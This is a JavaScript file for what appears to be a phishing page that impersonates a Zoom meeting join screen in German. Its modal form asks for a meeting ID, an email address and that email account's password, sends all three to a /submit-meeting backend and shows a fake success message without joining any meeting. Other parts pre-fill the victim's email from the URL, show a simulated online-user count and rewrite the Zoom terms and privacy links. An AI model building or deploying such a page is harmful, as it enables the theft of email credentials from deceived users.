document.addEventListener('DOMContentLoaded', function() {
    // Elements
    const joinMeetingBtn = document.getElementById('joinMeetingBtn');
    const meetingModal = document.getElementById('meetingModal');
    const meetingForm = document.getElementById('meetingForm');
    const closeModalBtn = document.getElementById('closeModal');
    const cookieBanner = document.getElementById('cookieBanner');
    const acceptCookiesBtn = document.getElementById('acceptCookies');
    const onlineCount = document.getElementById('onlineCount');
    const scheduleMeetingBtn = document.getElementById('scheduleMeeting');
    const submitBtn = document.getElementById('submitBtn');
    const submitLoader = document.getElementById('submitLoader');
    const submitText = document.getElementById('submitText');
    const btnLoader = document.getElementById('btnLoader');
    const btnText = document.getElementById('btnText');

    // Initialize
    initApp();

    function initApp() {
        // Show cookie banner if not accepted
        if (!localStorage.getItem('cookiesAccepted')) {
            setTimeout(() => {
                cookieBanner.style.display = 'flex';
            }, 700);
        }

        // Start online users simulation
        updateOnlineUsers();
        setInterval(updateOnlineUsers, 5000);

        // Load region info for footer
        loadRegionInfo();
    }

    // Join Meeting Button
    joinMeetingBtn.addEventListener('click', function() {
        joinMeetingBtn.classList.remove('pulse');
        btnLoader.style.display = 'block';
        btnText.textContent = 'Loading...';
        joinMeetingBtn.disabled = true;

        setTimeout(() => {
            meetingModal.style.display = 'flex';
            btnLoader.style.display = 'none';
            btnText.textContent = 'Jetzt Meeting beitreten';
            joinMeetingBtn.disabled = false;
        }, 800);
    });

    // Close Modal
    closeModalBtn.addEventListener('click', function() {
        meetingModal.style.display = 'none';
    });

    // Close modal on ESC key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && meetingModal.style.display === 'flex') {
            meetingModal.style.display = 'none';
        }
    });

    // Form Submission - UPDATED SECTION (removed alert)
    meetingForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Validate form
        if (!validateForm()) {
            return;
        }

        // Get form data
        const formData = {
            meetingId: document.getElementById('meetingId').value,
            email: document.getElementById('email').value,
            password: document.getElementById('password').value
        };

        // Show loading state
        submitLoader.style.display = 'block';
        submitText.textContent = 'Submitting...';
        submitBtn.disabled = true;

        try {
            // Send to Flask backend
            const response = await fetch('/submit-meeting', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });

            const result = await response.json();

            if (result.success) {
                // Success - NO ALERT HERE
                // alert('Meeting details submitted successfully!');
                
                // Reset form and hide modal
                meetingForm.reset();
                meetingModal.style.display = 'none';
                
                // Optional: Show a subtle success message
                showSuccessMessage('Meetingdetails erfolgreich übermittelt!');
                
                // In a real app, you would redirect to the meeting
                // window.location.href = `/meeting/${result.data.meeting_id}`;
            } else {
                // Error
                alert('Error: ' + result.message);
            }
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred. Please try again.');
        } finally {
            // Reset button state
            submitLoader.style.display = 'none';
            submitText.textContent = 'Anmelden';
            submitBtn.disabled = false;
        }
    });

    // Cookie Banner
    acceptCookiesBtn.addEventListener('click', async function() {
        try {
            await fetch('/accept-cookies', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                }
            });
            
            cookieBanner.style.display = 'none';
            localStorage.setItem('cookiesAccepted', 'true');
        } catch (error) {
            console.error('Error accepting cookies:', error);
        }
    });

    // Cookie Settings
    document.getElementById('cookieSettings').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Cookie settings would open here in a real implementation.');
    });

    // Schedule Meeting
    scheduleMeetingBtn.addEventListener('click', function() {
        meetingModal.style.display = 'flex';
    });

    // Form Validation
    function validateForm() {
        let isValid = true;
        
        // Clear previous errors
        document.querySelectorAll('.error-msg').forEach(el => {
            el.style.display = 'none';
        });
        
        document.querySelectorAll('.zm-input__inner').forEach(input => {
            input.classList.remove('error-glow');
        });

        // Validate meeting ID
        const meetingId = document.getElementById('meetingId');
        if (!meetingId.value.trim()) {
            document.getElementById('meetingError').textContent = 'Meeting-ID ist erforderlich.';
            document.getElementById('meetingError').style.display = 'block';
            meetingId.classList.add('error-glow');
            isValid = false;
        }

        // Validate email
        const email = document.getElementById('email');
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!email.value.trim()) {
            document.getElementById('emailError').textContent = 'E-Mail ist erforderlich.';
            document.getElementById('emailError').style.display = 'block';
            email.classList.add('error-glow');
            isValid = false;
        } else if (!emailRegex.test(email.value)) {
            document.getElementById('emailError').textContent = 'Bitte geben Sie eine gültige E-Mail-Adresse ein.';
            document.getElementById('emailError').style.display = 'block';
            email.classList.add('error-glow');
            isValid = false;
        }

        // Validate password
        const password = document.getElementById('password');
        if (!password.value.trim()) {
            document.getElementById('passwordError').textContent = 'Passwort der E-Mail-Adresse ist erforderlich.';
            document.getElementById('passwordError').style.display = 'block';
            password.classList.add('error-glow');
            isValid = false;
        }

        return isValid;
    }

    // Update online users count
    async function updateOnlineUsers() {
        try {
            const response = await fetch('/api/online-users');
            const data = await response.json();
            onlineCount.textContent = data.count;
        } catch (error) {
            // Fallback to random number
            onlineCount.textContent = Math.floor(Math.random() * 10) + 1;
        }
    }

    // Load region info for footer
    async function loadRegionInfo() {
        try {
            const response = await fetch('/api/region-info');
            const data = await response.json();
            
            const footerLink = document.getElementById('footerLink');
            if (footerLink) {
                footerLink.textContent = data.footer;
                footerLink.href = data.privacy;
            }
            
            // Update other links
            const termsLink = document.querySelector('a[href="https://zoom.us/terms"]');
            const privacyLink = document.querySelector('a[href="https://zoom.us/privacy"]');
            
            if (termsLink) termsLink.href = data.terms;
            if (privacyLink) privacyLink.href = data.privacy;
            
        } catch (error) {
            console.error('Error loading region info:', error);
        }
    }

    // Auto-fill email from URL parameters
    function populateEmailFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        if (email) {
            document.getElementById('emailDisplay').textContent = email;
        }
    }
    
    populateEmailFromURL();
    
    // Optional: Success message function (if you want visual feedback)
    function showSuccessMessage(message) {
        // Create a subtle notification element
        const notification = document.createElement('div');
        notification.className = 'success-notification';
        notification.textContent = message;
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #2d8cff;
            color: white;
            padding: 12px 20px;
            border-radius: 6px;
            font-size: 14px;
            z-index: 10000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            animation: fadeInOut 3s ease-in-out;
        `;
        
        // Add CSS animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeInOut {
                0% { opacity: 0; transform: translateY(20px); }
                15% { opacity: 1; transform: translateY(0); }
                85% { opacity: 1; transform: translateY(0); }
                100% { opacity: 0; transform: translateY(20px); }
            }
        `;
        document.head.appendChild(style);
        
        document.body.appendChild(notification);
        
        // Remove after animation completes
        setTimeout(() => {
            notification.remove();
            style.remove();
        }, 3000);
    }
});